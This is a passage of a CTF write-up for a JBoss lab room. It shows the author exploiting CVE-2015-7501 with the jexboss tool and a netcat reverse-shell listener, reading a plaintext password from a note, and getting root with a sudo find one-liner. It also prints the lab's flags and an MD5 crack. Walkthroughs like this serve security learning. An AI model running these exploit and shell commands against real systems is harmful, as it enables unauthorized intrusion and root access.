- OK, now we have a little map. Per hint in the challenge, first flag should be somewhere in the blogs section. Since there was nothing in source code, I downloaded both pictures and run them through `steghide` but got nothing.
  But there is one more option that will give us the flag and you use it all the time.

  ```
  cat frost.jpg
  [SNIP!]
  THM{Tony_Sure_Loves_Frosted_Flakes}
  ```
  
- Yep, it's `cat`, you can also use `strings`. I also found credentials for admin portal and logged in, but honestly there was nothing much to be found. Let's move to exploitation.

## ‚öôÔ∏è Shell Access

- Task tells us to research `CVE-2015-7501` and find a way to obtain shell, so I did that and found this really cool tool that will give you a reverse shell. You can find it [here](https://github.com/joaomatosf/jexboss.git).

- Tool is pretty easy to use, clone the repo and run it with Python, also install dependencies if needed. Tool has few options and first one didn't work for me at all, then I tried second one with `netcat` and got a reverse shell!

  ```
  git clone https://github.com/joaomatosf/jexboss.git
  cd jexboss
  python jexboss.py -host http://target_host:8080

  nc -lvnp 4444

  python3 jexboss.py -host http://10.10.194.49:8080

- I had to put my baby putty shell in action as well then started looking for last two flags.

## üßç User Privilege Escalation

- This is one self-explained, it's in the `/home/jboss`.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt 
  THM{50c10ad46b5793704601ecdad865eb06}
  ```
  
- Now it's escalation time!

---

## üëë Root Privilege Escalation

- There is another file in `/home/jboss` named `note`, read it.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ cat note 
  Hey JBoss!
  
  Following your email, I have tried to replicate the issues you were having with the system.
  
  However, I don't know what commands you executed - is there any file where this history is stored that I can access?
  
  Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
  
  Password: likeaboss
  
  Kind Regards,
  CMNatic
  ```
  
- OK, awesome, now we have credentials of user `jboss`, switch to that user and use `sudo -l` for final part of exploitation.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ su jboss
  Password: 
  jboss@thm-java-deserial:~$ id
  uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
  
  jboss@thm-java-deserial:~$ sudo -l
  Matching Defaults entries for jboss on thm-java-deserial:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jboss may run the following commands on thm-java-deserial:
      (ALL) NOPASSWD: /usr/bin/find
  ```
  
- There is a one liner that will give you root, you can find it on GTFOBins. Use it then read the last flag.

  ```
  jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
  # whoami
  root
  
  # cat /root/root.txt
  QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
  ```

- Do a little bit of decoding and you should get final flag. First decode this Base64 string then crack the MD5 string and it's done.

  ```
  echo 'QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==' | base64 -d
  BC77AC072EE30E3760806864E234C7CF

  BC77AC072EE30E3760806864E234C7CF (MD5) 
  zxcvbnm123456789
  ```

- **User Flag**: `THM{50c10ad46b5793704601ecdad865eb06}`

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Some parts of exploitation but nothing that little bit of googling will resolve`

- What did I learn?
  `New tool, new CVE, new exploits!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
